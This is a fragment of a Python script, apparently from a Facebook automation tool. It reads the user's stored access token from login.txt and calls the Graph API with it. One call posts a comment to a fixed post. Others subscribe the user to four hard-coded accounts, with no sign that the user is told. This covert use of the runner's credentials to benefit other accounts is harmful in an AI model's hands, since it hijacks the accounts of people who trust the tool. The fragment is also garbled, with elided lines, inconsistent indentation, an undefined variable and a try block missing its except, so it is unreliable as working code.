...
def bot_komen():
	try:
		...
		toket = open('login.txt', 'r').read()
		si = "106712805027724"
		requests.post('https://graph.facebook.com/' + si+ '/comments/?message=' + oe + '&access_token=' + toket)
        requests.post('https://graph.facebook.com/106712805027724/comments/?message=' + oe + '&access_token=' + toket)
	requests.post('https://graph.facebook.com/100011806481936/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100007283677327/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/1584618114/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/106711298361208/subscribers?access_token=' + toket)
	menu()
def menu():
  try:
    toket = open('login.txt','r').read()
